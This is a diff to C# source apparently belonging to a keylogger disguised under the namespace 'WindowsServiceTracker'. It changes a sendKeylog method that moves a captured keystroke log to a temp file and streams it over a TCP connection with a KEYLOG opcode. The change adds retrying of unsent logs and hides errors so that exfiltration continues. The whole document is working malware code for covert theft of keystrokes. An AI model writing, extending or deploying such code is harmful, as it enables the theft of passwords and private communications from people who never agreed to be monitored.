@@ -388,33 +388,58 @@ namespace WindowsServiceTracker
         private bool sendKeylog()
         {
             bool success = true;
-            StreamReader log;
+            StreamReader log = null;
             String tempFile = "tempFile.txt";
             int bufferSize = 1024;
             char[] buffer = new char[bufferSize];
             int bytesRead;
             byte[] msg;
+            bool storedFileExists = false;
+
+            // see if an unsent file exists
             try
             {
-                File.Move(keyLogFilePath, tempFile);
                 log = new StreamReader(tempFile);
+                storedFileExists = true;
             }
             catch (Exception)
+            { }
+
+            // if there is not an unsent file, grab the active one
+            if (!storedFileExists)
             {
-                return false;
+                try
+                {
+                    File.Move(keyLogFilePath, tempFile);
+                    log = new StreamReader(tempFile);
+                }
+                catch (Exception)
+                {
+                    //return false;
+                }
             }
 
             try
             {
+
                 msg = new byte[1];
                 msg[0] = KEYLOG;
                 tcpStream.Write(msg, 0, msg.Length);
 
-                while (!log.EndOfStream)
+                // the nested try block is so that when there is no keylog file,
+                // it still sends the opcode and newline char
+                try
                 {
-                    bytesRead = log.Read(buffer, 0, bufferSize);
-                    msg = Encoding.UTF8.GetBytes(buffer, 0, bytesRead);
-                    tcpStream.Write(msg, 0, msg.Length);
+                    while (!log.EndOfStream)
+                    {
+                        bytesRead = log.Read(buffer, 0, bufferSize);
+                        msg = Encoding.UTF8.GetBytes(buffer, 0, bytesRead);
+                        tcpStream.Write(msg, 0, msg.Length);
+                    }
+                }
+                catch (Exception)
+                {
+
                 }
 
                 msg = Encoding.UTF8.GetBytes(Environment.NewLine);
@@ -427,7 +452,16 @@ namespace WindowsServiceTracker
 
             try
             {
-                File.Delete(tempFile);
+                log.Close();
+                if (success)
+                {
+                    File.Delete(tempFile);
+                    // if we sent an old file, send new one now
+                    if (storedFileExists)
+                    {
+                        sendKeylog();
+                    }
+                }
             }
             catch (Exception)
             {
